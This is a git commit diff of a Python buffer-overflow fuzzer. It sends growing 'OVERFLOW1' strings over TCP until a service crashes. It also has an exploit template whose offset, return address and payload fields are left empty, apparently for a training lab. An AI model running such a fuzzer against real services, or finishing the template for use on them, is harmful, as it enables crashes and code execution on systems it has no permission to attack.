301fb43e216a07639c8453f3649319641bcc5c1d
Victor Fernandez III <48382964+cyberphor@users.noreply.github.com>
2021-05-01 16:35:38 -0600

    Update gbfuzzer.py

--- Code/gbfuzzer.py
+++ Code/gbfuzzer.py
@@ -1,36 +1,75 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
-import socket 
-import sys 
-import time 
+import argparse
+import socket
+import sys
+import time
 
-address = "10.10.10.10"
-port = 80
-target
-size = 100 
+parser = argparse.ArgumentParser()
+parser.add_argument('--fuzz',action='store_true')
+parser.add_argument('--flood',action='store_true')
+parser.add_argument('--host')
+parser.add_argument('--port',type=int)
+parser.add_argument('--timeout',type=int)
+args = parser.parse_args()
 
-while(size < 2000): 
+ip = args.host
+port = args.port
+target = (ip,port)
+timeout = args.timeout
+
+def fuzz():
+    prefix = "OVERFLOW1 "
+    string = prefix + "A" * 100
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
+                client.settimeout(timeout)
+                client.connect(target)
+                client.recv(1024)
+                print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
+                client.send(bytes(string, "latin-1"))
+                client.recv(1024)
+        except socket.error as err:
+            print("[x] Failed to connect to port %d." % port)
+            sys.exit(0)
+        except:
+            print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+            sys.exit(0)
+        
+        string += 100 * "A"
+        time.sleep(1)
+
+def flood():
+    prefix = "OVERFLOW1 "
+    offset = 0
+    overflow = "A" * offset
+    retn = ""
+    padding = ""
+    payload = ""
+    suffix = ""
+    bof = prefix + overflow + retn + padding + payload + suffix
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        print("[*] Fuzzing with %s bytes" % size)
-        fuzz = "A" * size
-        content = "username=" + fuzz + "&password=A"
-        buffer = "POST /login HTTP/1.1\r\n"
-        buffer += "Host: " + address + "\r\n"
-        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
-        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
-        buffer += "Referer: http://" + address + "/login\r\n"
-        buffer += "Connection: close\r\n"
-        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
-        buffer += "Content-Length: " + str(len(content)) + "\r\n"
-        buffer += "\r\n"
-        buffer += content
-        client = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
-        client.connect((address, port))
-        client.send(buffer)
-        client.close()
-        size += 100
-        time.sleep(10)
+        client.connect(target)
+        client.send(bytes(bof + "\r\n","latin-1"))
+        print("[+] Sent BOF.")
+        client.recv(1024)
     except:
-        print("[x] Failed to connect to " + address)
-        sys.exit()
+        print("[x] Failed to connect to port %d." % port)
+
+if __name__ == "__main__":
+    if not args.fuzz and not args.flood:
+        print("[x] Please specify an option using either --fuzz or --flood.")
+    if not args.host:
+        print("[x] Please specify a host using --host.")
+    elif not args.port:
+        print("[x] Please specify a port using --port.")
+    elif not args.timeout:
+        print("[x] Please specify a connection timeout using --timeout.")
+    
+    if args.fuzz:
+        fuzz()
+    elif args.flood:
+        flood()
